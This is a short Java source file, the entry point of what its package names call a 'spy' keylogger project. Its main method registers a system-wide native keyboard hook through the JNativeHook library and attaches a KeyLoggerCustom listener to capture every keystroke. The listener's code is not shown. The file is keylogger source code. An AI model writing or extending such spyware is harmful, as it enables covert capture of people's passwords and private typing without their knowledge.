package com.fabio.spy.main;

/**
 * 
 * Author Fabio Petricola
 */
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import com.fabio.spy.keylogger.KeyLoggerCustom;

public class SpyMain {
	
	public static void main(String[] args) {
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new KeyLoggerCustom());
	}

}
